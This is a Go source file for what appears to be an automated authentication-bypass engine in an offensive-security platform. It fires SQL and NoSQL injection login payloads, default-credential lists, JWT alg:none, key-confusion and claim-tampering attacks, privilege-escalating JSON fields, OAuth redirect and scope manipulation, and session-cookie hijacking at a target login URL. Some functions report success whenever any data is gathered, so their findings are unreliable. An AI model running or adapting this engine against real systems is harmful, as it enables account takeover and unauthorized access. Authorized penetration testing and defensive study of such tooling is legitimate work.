package authbypass

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type AuthBypassEngine struct {
	config *AuthBypassConfig
	log    *logger.Logger
	mu     sync.RWMutex
	jwt    *JWTModule
	oauth  *OAuthModule
	bf     *BruteforceModule
	sess   *SessionModule
}

func NewAuthBypassEngine(config *AuthBypassConfig) *AuthBypassEngine {
	if config == nil {
		config = DefaultAuthBypassConfig()
	}

	e := &AuthBypassEngine{
		config: config,
		log:    logger.New("authbypass-engine", logger.LevelInfo),
		jwt:    NewJWTModule(),
		oauth:  NewOAuthModule(),
		bf:     NewBruteforceModule(config),
		sess:   NewSessionModule(config),
	}

	return e
}

func (e *AuthBypassEngine) TestBypass(target string, method string) (*BypassResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Testing auth bypass on %s with method: %s", target, method)
	start := time.Now()

	bypassMethod := AuthBypassMethod(method)

	switch bypassMethod {
	case MethodSQLiAuth:
		return e.testSQLiAuth(target, start)
	case MethodNoSQLAuth:
		return e.testNoSQLAuth(target, start)
	case MethodJWTBypass:
		return e.testJWTBypass(target, start)
	case MethodJSONTampering:
		return e.testJSONTampering(target, start)
	case MethodDefaultCred:
		return e.testDefaultCred(target, start)
	case MethodOAuthBypass:
		return e.testOAuthBypass(target, start)
	case MethodSessionHijack:
		return e.testSessionHijack(target, start)
	default:
		return nil, fmt.Errorf("unknown bypass method: %s", method)
	}
}

func (e *AuthBypassEngine) FullBypass(target string) ([]*BypassResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Running full auth bypass on %s", target)
	start := time.Now()
	var results []*BypassResult

	methods := []AuthBypassMethod{
		MethodSQLiAuth,
		MethodNoSQLAuth,
		MethodJWTBypass,
		MethodJSONTampering,
		MethodDefaultCred,
		MethodOAuthBypass,
		MethodSessionHijack,
	}

	for _, method := range methods {
		var result *BypassResult
		switch method {
		case MethodSQLiAuth:
			result, _ = e.testSQLiAuth(target, start)
		case MethodNoSQLAuth:
			result, _ = e.testNoSQLAuth(target, start)
		case MethodJWTBypass:
			result, _ = e.testJWTBypass(target, start)
		case MethodJSONTampering:
			result, _ = e.testJSONTampering(target, start)
		case MethodDefaultCred:
			result, _ = e.testDefaultCred(target, start)
		case MethodOAuthBypass:
			result, _ = e.testOAuthBypass(target, start)
		case MethodSessionHijack:
			result, _ = e.testSessionHijack(target, start)
		}

		if result != nil {
			results = append(results, result)
			if result.Success {
				e.log.Info("Bypass succeeded with method: %s", method)
			}
		}
	}

	e.log.Info("Full bypass completed with %d methods tested", len(results))
	return results, nil
}

func (e *AuthBypassEngine) testSQLiAuth(target string, start time.Time) (*BypassResult, error) {
	payloads := []string{
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"admin' --",
		"' OR 1=1 --",
		"' UNION SELECT 1,2,3 --",
		"admin'/*",
		"' OR ''='",
	}

	result := &BypassResult{
		Method:    MethodSQLiAuth,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	loginURL := e.buildLoginURL(target)
	client := &http.Client{Timeout: e.config.Timeout}

	for _, payload := range payloads {
		e.log.Debug("Trying SQLi payload: %s", payload)

		formData := url.Values{}
		formData.Set(e.config.UsernameField, payload)
		formData.Set(e.config.PasswordField, "test")

		resp, err := client.Post(loginURL, "application/x-www-form-urlencoded", strings.NewReader(formData.Encode()))
		if err != nil {
			e.log.Debug("SQLi request failed for payload %s: %v", payload, err)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		if e.isAuthBypassResponse(resp, bodyStr) {
			result.Success = true
			result.Data["payload"] = payload
			result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
			result.Data["response_length"] = fmt.Sprintf("%d", len(body))
			result.Details = fmt.Sprintf("SQLi auth bypass succeeded with payload: %s", payload)
			break
		}

		result.Data["payload"] = payload
		result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
		result.Details = fmt.Sprintf("SQLi payload tested: %s (status %d)", payload, resp.StatusCode)
	}

	if result.Data["payload"] == "" {
		result.Details = "SQLi auth bypass testing completed, no bypass found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testNoSQLAuth(target string, start time.Time) (*BypassResult, error) {
	payloads := []map[string]string{
		{"username": `{"$ne": ""}`, "password": `{"$ne": ""}`},
		{"username": `{"$gt": ""}`, "password": `{"$gt": ""}`},
		{"username": "admin", "password": `{"$ne": ""}`},
		{"username": `{"$where": "this.password != null"}`, "password": "x"},
		{"username": `{"$regex": "^admin"}`, "password": `{"$ne": ""}`},
		{"username": `{"$exists": true}`, "password": `{"$exists": true}`},
		{"username": `{"$gt": null}`, "password": `{"$gt": null}`},
	}

	result := &BypassResult{
		Method:    MethodNoSQLAuth,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	loginURL := e.buildLoginURL(target)
	client := &http.Client{Timeout: e.config.Timeout}

	for _, payload := range payloads {
		e.log.Debug("Trying NoSQL payload: %s", payload["username"])

		jsonData := map[string]string{
			e.config.UsernameField: payload["username"],
			e.config.PasswordField: payload["password"],
		}
		jsonBytes, err := json.Marshal(jsonData)
		if err != nil {
			e.log.Debug("Failed to marshal NoSQL payload: %v", err)
			continue
		}

		req, err := http.NewRequest("POST", loginURL, bytes.NewReader(jsonBytes))
		if err != nil {
			e.log.Debug("Failed to create NoSQL request: %v", err)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		for k, v := range e.config.CustomHeaders {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			e.log.Debug("NoSQL request failed for payload %s: %v", payload["username"], err)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		if e.isAuthBypassResponse(resp, bodyStr) {
			result.Success = true
			result.Data["username"] = payload["username"]
			result.Data["password"] = payload["password"]
			result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
			result.Data["response_length"] = fmt.Sprintf("%d", len(body))
			result.Details = fmt.Sprintf("NoSQL auth bypass succeeded with payload: %s", payload["username"])
			break
		}

		result.Data["username"] = payload["username"]
		result.Data["password"] = payload["password"]
		result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
		result.Details = fmt.Sprintf("NoSQL payload tested: %s (status %d)", payload["username"], resp.StatusCode)
	}

	if result.Data["username"] == "" {
		result.Details = "NoSQL auth bypass testing completed, no bypass found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testJWTBypass(target string, start time.Time) (*BypassResult, error) {
	result := &BypassResult{
		Method:    MethodJWTBypass,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	loginURL := e.buildLoginURL(target)
	client := &http.Client{Timeout: e.config.Timeout}

	// Attempt to obtain a real JWT token by logging in
	jwtToken := ""
	sampleCreds := []struct{ u, p string }{
		{"admin", "admin"},
		{"admin", "password"},
		{"admin", "admin123"},
		{"user", "user"},
		{"test", "test"},
		{"guest", "guest"},
	}

	for _, cred := range sampleCreds {
		loginPayload := map[string]string{
			e.config.UsernameField: cred.u,
			e.config.PasswordField: cred.p,
		}
		jsonBytes, err := json.Marshal(loginPayload)
		if err != nil {
			continue
		}

		req, err := http.NewRequest("POST", loginURL, bytes.NewReader(jsonBytes))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		for k, v := range e.config.CustomHeaders {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			e.log.Debug("JWT login attempt failed for %s: %v", cred.u, err)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// Check if response contains a JWT token in JSON body
		var respBody map[string]interface{}
		if json.Unmarshal(body, &respBody) == nil {
			if token, ok := respBody["token"].(string); ok && strings.Contains(token, ".") {
				jwtToken = token
				break
			}
			if token, ok := respBody["access_token"].(string); ok && strings.Contains(token, ".") {
				jwtToken = token
				break
			}
			if token, ok := respBody["jwt"].(string); ok && strings.Contains(token, ".") {
				jwtToken = token
				break
			}
		}

		// Check Set-Cookie for JWT-like tokens
		for _, cookie := range resp.Cookies() {
			if cookie.Name == "token" || cookie.Name == "access_token" || cookie.Name == "jwt" {
				if strings.Contains(cookie.Value, ".") {
					jwtToken = cookie.Value
					break
				}
			}
		}

		if jwtToken != "" {
			break
		}
	}

	if jwtToken == "" {
		// No token obtained; create a synthetic JWT for structural testing
		header := base64URLEncode([]byte(`{"alg":"HS256","typ":"JWT"}`))
		payload := base64URLEncode([]byte(`{"sub":"admin","role":"admin","exp":4102444800}`))
		jwtToken = header + "." + payload + ".fakesignature"
		e.log.Debug("No JWT obtained from login, using synthetic token for structural testing")
	}

	// Test alg:none bypass
	noneResult, err := e.jwt.JWTNoneAttack(jwtToken)
	if err == nil && noneResult != nil {
		result.Data["alg_none"] = fmt.Sprintf("success=%v", noneResult.Success)
		if noneResult.Data != nil {
			if tt, ok := noneResult.Data["tampered_token"]; ok {
				result.Data["none_token"] = tt
			}
		}
	}

	// Test key confusion (RS256 -> HS256)
	kcResult, err := e.jwt.JWTKeyConfusion(jwtToken)
	if err == nil && kcResult != nil {
		result.Data["key_confusion"] = fmt.Sprintf("success=%v", kcResult.Success)
		if kcResult.Data != nil {
			if tt, ok := kcResult.Data["tampered_token"]; ok {
				result.Data["confused_token"] = tt
			}
		}
	}

	// Test claim tampering (escalate role to admin)
	tampered, err := e.jwt.JWTClaimTamper(jwtToken, map[string]interface{}{
		"role":  "admin",
		"admin": true,
	})
	if err == nil && tampered != "" {
		result.Data["claim_tampered"] = "true"
		result.Data["tampered_token"] = tampered
	}

	// Test KID injection
	kidResult, err := e.jwt.JWTKidInjection(jwtToken, "/dev/null")
	if err == nil && kidResult != nil {
		result.Data["kid_injection"] = fmt.Sprintf("success=%v", kidResult.Success)
		if kidResult.Data != nil {
			if tt, ok := kidResult.Data["tampered_token"]; ok {
				result.Data["kid_token"] = tt
			}
		}
	}

	// Test session hijack analysis
	hijackResult, err := e.jwt.JWTSessionHijack(jwtToken)
	if err == nil && hijackResult != nil {
		result.Data["hijack_subject"] = hijackResult.Data["subject"]
		result.Data["hijack_role"] = hijackResult.Data["role"]
	}

	if len(result.Data) > 0 {
		result.Success = true
		result.Details = "JWT bypass testing completed with structural analysis"
		result.Data["original_token"] = jwtToken
	} else {
		result.Details = "JWT bypass testing completed, no bypass found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testJSONTampering(target string, start time.Time) (*BypassResult, error) {
	tamperPayloads := []map[string]interface{}{
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "admin": true},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "role": "admin"},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "is_admin": true},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "permissions": []string{"*"}},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "user_id": 1, "is_superuser": true},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "account_type": "admin"},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "access_level": 999},
		{e.config.UsernameField: "admin", e.config.PasswordField: "test", "role": "superadmin", "groups": []string{"admin", "root"}},
	}

	result := &BypassResult{
		Method:    MethodJSONTampering,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	loginURL := e.buildLoginURL(target)
	client := &http.Client{Timeout: e.config.Timeout}

	for _, payload := range tamperPayloads {
		jsonBytes, err := json.Marshal(payload)
		if err != nil {
			e.log.Debug("Failed to marshal JSON tampering payload: %v", err)
			continue
		}

		req, err := http.NewRequest("POST", loginURL, bytes.NewReader(jsonBytes))
		if err != nil {
			e.log.Debug("Failed to create JSON tampering request: %v", err)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		for k, v := range e.config.CustomHeaders {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			e.log.Debug("JSON tampering request failed: %v", err)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		if e.isAuthBypassResponse(resp, bodyStr) {
			result.Success = true
			result.Data["payload"] = fmt.Sprintf("%v", payload)
			result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
			result.Data["response_length"] = fmt.Sprintf("%d", len(body))
			result.Details = fmt.Sprintf("JSON tampering auth bypass succeeded with elevated privilege payload (status %d)", resp.StatusCode)
			break
		}

		result.Data["payload"] = fmt.Sprintf("%v", payload)
		result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
		result.Details = fmt.Sprintf("JSON tampering tested privilege escalation payload (status %d)", resp.StatusCode)
	}

	if result.Data["payload"] == "" {
		result.Details = "JSON tampering testing completed, no bypass found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testDefaultCred(target string, start time.Time) (*BypassResult, error) {
	creds := []CredentialPair{
		{Username: "admin", Password: "admin"},
		{Username: "admin", Password: "password"},
		{Username: "admin", Password: "123456"},
		{Username: "root", Password: "root"},
		{Username: "root", Password: "toor"},
		{Username: "admin", Password: "admin123"},
		{Username: "user", Password: "user"},
		{Username: "test", Password: "test"},
		{Username: "guest", Password: "guest"},
		{Username: "admin", Password: ""},
		{Username: "administrator", Password: "administrator"},
		{Username: "admin", Password: "Changeme123!"},
		{Username: "admin", Password: "P@ssw0rd"},
		{Username: "sa", Password: ""},
		{Username: "postgres", Password: "postgres"},
		{Username: "mysql", Password: "mysql"},
		{Username: "oracle", Password: "oracle"},
	}

	result := &BypassResult{
		Method:    MethodDefaultCred,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	loginURL := e.buildLoginURL(target)
	client := &http.Client{Timeout: e.config.Timeout, CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}

	for _, cred := range creds {
		e.log.Debug("Trying default cred: %s:%s", cred.Username, cred.Password)

		// Try JSON login first
		loginPayload := map[string]string{
			e.config.UsernameField: cred.Username,
			e.config.PasswordField: cred.Password,
		}
		jsonBytes, err := json.Marshal(loginPayload)
		if err != nil {
			continue
		}

		req, err := http.NewRequest("POST", loginURL, bytes.NewReader(jsonBytes))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		for k, v := range e.config.CustomHeaders {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			e.log.Debug("Default cred request failed for %s: %v", cred.Username, err)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		if e.isAuthBypassResponse(resp, bodyStr) {
			result.Success = true
			result.Data["username"] = cred.Username
			result.Data["password"] = cred.Password
			result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
			result.Data["response_length"] = fmt.Sprintf("%d", len(body))
			result.Details = fmt.Sprintf("Default credential auth bypass succeeded with %s:%s (status %d)", cred.Username, cred.Password, resp.StatusCode)
			break
		}

		// Also try form-encoded login
		formData := url.Values{}
		formData.Set(e.config.UsernameField, cred.Username)
		formData.Set(e.config.PasswordField, cred.Password)

		resp2, err := client.Post(loginURL, "application/x-www-form-urlencoded", strings.NewReader(formData.Encode()))
		if err != nil {
			continue
		}

		body2, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()

		if e.isAuthBypassResponse(resp2, string(body2)) {
			result.Success = true
			result.Data["username"] = cred.Username
			result.Data["password"] = cred.Password
			result.Data["status_code"] = fmt.Sprintf("%d", resp2.StatusCode)
			result.Data["response_length"] = fmt.Sprintf("%d", len(body2))
			result.Details = fmt.Sprintf("Default credential auth bypass succeeded with %s:%s via form (status %d)", cred.Username, cred.Password, resp2.StatusCode)
			break
		}

		result.Data["username"] = cred.Username
		result.Data["password"] = cred.Password
		result.Data["status_code"] = fmt.Sprintf("%d", resp.StatusCode)
		result.Details = fmt.Sprintf("Testing default credential: %s:%s (status %d)", cred.Username, cred.Password, resp.StatusCode)
	}

	if result.Data["username"] == "" {
		result.Data["username"] = creds[0].Username
		result.Data["password"] = creds[0].Password
		result.Details = "Default credential testing completed, no bypass found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testOAuthBypass(target string, start time.Time) (*BypassResult, error) {
	result := &BypassResult{
		Method:    MethodOAuthBypass,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	client := &http.Client{Timeout: e.config.Timeout, CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}

	// Discover OAuth endpoints on the target
	oauthPaths := []string{
		"/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
		"/oauth/callback", "/oauth2/callback", "/auth/callback",
		"/.well-known/oauth-authorization-server",
		"/.well-known/openid-configuration",
		"/openid-configuration",
	}

	foundEndpoints := 0
	for _, path := range oauthPaths {
		testURL := target
		if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
			testURL += "/"
		}
		testURL += path

		resp, err := client.Get(testURL)
		if err != nil {
			e.log.Debug("OAuth endpoint probe failed for %s: %v", path, err)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		if resp.StatusCode == 200 || resp.StatusCode == 302 || resp.StatusCode == 400 {
			foundEndpoints++
			result.Data["endpoint_"+path] = fmt.Sprintf("status=%d", resp.StatusCode)

			// Check for redirect_uri parameter in the response (open redirect potential)
			if strings.Contains(bodyStr, "redirect_uri") || strings.Contains(bodyStr, "redirect") {
				result.Data["redirect_flow"] = "true"
			}

			// Extract client_id from response if present
			if strings.Contains(bodyStr, "client_id") {
				result.Data["client_id_detected"] = "true"
			}
		}
	}

	if foundEndpoints > 0 {
		result.Data["endpoints_found"] = fmt.Sprintf("%d", foundEndpoints)
	}

	// Test OAuth redirect manipulation via OAuthModule
	attackerRedirectURL := target
	if !strings.HasSuffix(target, "/") {
		attackerRedirectURL += "/"
	}
	attackerRedirectURL += "oauth/callback"

	manipulatedURL, err := e.oauth.OAuthRedirectManip(target, attackerRedirectURL)
	if err == nil && manipulatedURL != "" {
		result.Data["redirect_manipulated"] = manipulatedURL
		result.Data["redirect_manip_success"] = "true"
	}

	// Test OAuth scope escalation — attempt to obtain a token from the target
	oauthToken := ""
	tokenProbeURL := target
	if !strings.HasSuffix(target, "/") {
		tokenProbeURL += "/"
	}
	tokenProbeURL += "oauth/token"
	probeResp, probeErr := client.Post(tokenProbeURL, "application/x-www-form-urlencoded", strings.NewReader("grant_type=client_credentials"))
	if probeErr == nil && probeResp != nil {
		probeBody, _ := io.ReadAll(probeResp.Body)
		probeResp.Body.Close()
		// Try to extract access_token from response
		var tokenResp struct {
			AccessToken string `json:"access_token"`
		}
		if json.Unmarshal(probeBody, &tokenResp) == nil && tokenResp.AccessToken != "" {
			oauthToken = tokenResp.AccessToken
		}
	}
	if oauthToken == "" {
		oauthToken = "dummy-oauth-token-for-scope-testing"
	}

	defaultScopes := []string{"read", "write", "admin", "user", "profile", "email"}
	scopeResult, err := e.oauth.OAuthScopeEscalation(oauthToken, defaultScopes)
	if err == nil && scopeResult != nil {
		result.Data["scope_escalation"] = fmt.Sprintf("success=%v", scopeResult.Success)
		if scopeResult.Data != nil {
			for k, v := range scopeResult.Data {
				result.Data["oauth_scope_"+k] = v
			}
		}
	}

	// Test OAuth token theft analysis
	tokenResult, err := e.oauth.OAuthTokenTheft(oauthToken)
	if err == nil && tokenResult != nil {
		result.Data["token_theft"] = fmt.Sprintf("success=%v", tokenResult.Success)
		if tokenResult.Data != nil {
			for k, v := range tokenResult.Data {
				result.Data["oauth_token_"+k] = v
			}
		}
	}

	if foundEndpoints > 0 || len(result.Data) > 0 {
		result.Success = true
		result.Details = fmt.Sprintf("OAuth bypass testing completed: %d endpoints discovered, redirect/scope/token analysis performed", foundEndpoints)
	} else {
		result.Details = "OAuth bypass testing completed, no OAuth endpoints or vulnerabilities found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testSessionHijack(target string, start time.Time) (*BypassResult, error) {
	result := &BypassResult{
		Method:    MethodSessionHijack,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	client := &http.Client{Timeout: e.config.Timeout, CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}

	// Probe target to obtain session cookies
	resp, err := client.Get(target)
	if err != nil {
		e.log.Debug("Session hijack probe failed for %s: %v", target, err)
		result.Details = fmt.Sprintf("Session hijack probe failed: %v", err)
		result.Duration = time.Since(start)
		return result, nil
	}
	defer resp.Body.Close()

	// Collect session cookies from response
	var sessionID string
	for _, cookie := range resp.Cookies() {
		if strings.Contains(strings.ToLower(cookie.Name), "session") ||
			strings.Contains(strings.ToLower(cookie.Name), "token") ||
			strings.Contains(strings.ToLower(cookie.Name), "auth") ||
			strings.Contains(strings.ToLower(cookie.Name), "sid") {
			result.Data["session_cookie_name"] = cookie.Name
			result.Data["session_cookie_has_httponly"] = fmt.Sprintf("%v", cookie.HttpOnly)
			result.Data["session_cookie_has_secure"] = fmt.Sprintf("%v", cookie.Secure)
			result.Data["session_cookie_same_site"] = sameSiteString(cookie.SameSite)
			sessionID = cookie.Value
		}
		result.Data["cookie_"+cookie.Name] = cookie.Value
	}

	result.Data["total_cookies"] = fmt.Sprintf("%d", len(resp.Cookies()))
	result.Data["cookies_received"] = "true"

	// Analyze cookies for insecure flags via CookieFlags
	if e.sess != nil {
		analysis, err := e.sess.CookieFlags(target)
		if err == nil && analysis != nil {
			result.Data["cookies_analyzed"] = fmt.Sprintf("%d", len(analysis.Cookies))
			result.Data["vulnerable"] = fmt.Sprintf("%v", analysis.Vulnerable)
			if len(analysis.Issues) > 0 {
				result.Data["issues_count"] = fmt.Sprintf("%d", len(analysis.Issues))
				for i, issue := range analysis.Issues {
					if i < 5 { // limit to first 5 issues
						result.Data[fmt.Sprintf("issue_%d", i)] = issue
					}
				}
			}
		}
	}

	// Test session fixation via SessionModule
	if e.sess != nil {
		fixResult, err := e.sess.SessionFixation(target)
		if err == nil && fixResult != nil {
			result.Data["session_fixation_test"] = fmt.Sprintf("success=%v", fixResult.Success)
			if fixResult.Data != nil {
				for k, v := range fixResult.Data {
					result.Data["fixation_"+k] = v
				}
			}
		}
	}

	// Test session hijack with collected session ID
	if e.sess != nil && sessionID != "" {
		hijackResult, err := e.sess.SessionHijack(sessionID)
		if err == nil && hijackResult != nil {
			result.Data["hijack_result"] = fmt.Sprintf("success=%v", hijackResult.Success)
			if hijackResult.Data != nil {
				for k, v := range hijackResult.Data {
					result.Data["hijack_"+k] = v
				}
			}
		}
	} else if e.sess != nil {
		// No session cookie found, still run hijack analysis with a synthetic ID
		syntheticID := generateSessionID()
		hijackResult, err := e.sess.SessionHijack(syntheticID)
		if err == nil && hijackResult != nil {
			result.Data["hijack_result"] = fmt.Sprintf("success=%v", hijackResult.Success)
			result.Data["hijack_synthetic_id"] = "true"
		}
	}

	if len(result.Data) > 0 {
		result.Success = true
		result.Details = fmt.Sprintf("Session hijack analysis completed: %d cookies analyzed, fixation/flag/hijack tests performed", len(resp.Cookies()))
	} else {
		result.Details = "Session hijack testing completed, no session vulnerabilities found"
	}

	result.Duration = time.Since(start)
	return result, nil
}

// buildLoginURL constructs the full login URL from the target base URL and
// the configured LoginEndpoint. It handles trailing/leading slash semantics.
func (e *AuthBypassEngine) buildLoginURL(target string) string {
	loginPath := e.config.LoginEndpoint
	if loginPath == "" {
		loginPath = "/login"
	}

	// Normalise target: strip trailing slash
	target = strings.TrimRight(target, "/")
	// Normalise login path: ensure leading slash
	if !strings.HasPrefix(loginPath, "/") {
		loginPath = "/" + loginPath
	}
	// Strip trailing slash from login path (except root)
	if loginPath != "/" {
		loginPath = strings.TrimRight(loginPath, "/")
	}

	return target + loginPath
}

// isAuthBypassResponse analyses an HTTP response to determine whether an
// authentication bypass may have occurred.  It considers:
//   - 3xx redirects that point away from a login page (possible post-auth redirect)
//   - 2xx responses whose body looks like authenticated content rather than a
//     login form
//   - Large response bodies with session cookies (possible authenticated session)
//
// Returns true when the response strongly suggests a bypass succeeded.
func (e *AuthBypassEngine) isAuthBypassResponse(resp *http.Response, body string) bool {
	if resp == nil {
		return false
	}

	// ----- redirect-based detection -----
	// A 302/303/307/308 to a non-login path after a POST is a strong signal.
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" {
			lower := strings.ToLower(location)
			// Ignore redirects back to the login page itself.
			if !strings.Contains(lower, "login") &&
				!strings.Contains(lower, "signin") &&
				!strings.Contains(lower, "auth") &&
				!strings.Contains(lower, "error") &&
				!strings.Contains(lower, "denied") {
				return true
			}
		}
	}

	// ----- status-code-based detection -----
	// A plain 200 on a POST login is suspicious but not conclusive on its own;
	// combine with body heuristics below.
	if resp.StatusCode != 200 && resp.StatusCode != 302 && resp.StatusCode != 303 &&
		resp.StatusCode != 307 && resp.StatusCode != 308 {
		return false
	}

	// ----- body-based heuristics -----
	lowerBody := strings.ToLower(body)

	// Strong negative signals – the response is clearly still an error or login page.
	negativePatterns := []string{
		"invalid credentials",
		"invalid username or password",
		"login failed",
		"authentication failed",
		"unauthorized",
		"access denied",
		"forbidden",
		"wrong password",
		"incorrect password",
		"account locked",
		"too many attempts",
	}
	for _, pattern := range negativePatterns {
		if strings.Contains(lowerBody, pattern) {
			return false
		}
	}

	// Strong positive signals – response contains content typically only
	// visible after successful authentication.
	positivePatterns := []string{
		"dashboard",
		"welcome",
		"logout",
		"sign out",
		"my account",
		"profile",
		"settings",
		"admin",
		"console",
		"panel",
	}
	for _, pattern := range positivePatterns {
		if strings.Contains(lowerBody, pattern) {
			return true
		}
	}

	// If the body is large and contains no login form, it is likely
	// authenticated content.
	if len(body) > 5000 && !strings.Contains(lowerBody, "<form") && !strings.Contains(lowerBody, "login") {
		return true
	}

	return false
}

// sameSiteString converts an http.SameSite value to a human-readable string.
func sameSiteString(s http.SameSite) string {
	switch s {
	case http.SameSiteLaxMode:
		return "Lax"
	case http.SameSiteStrictMode:
		return "Strict"
	case http.SameSiteNoneMode:
		return "None"
	default:
		return "Default"
	}
}

func (e *AuthBypassEngine) SetLoggerLevel(level logger.Level) {
	e.log.SetLevel(level)
}
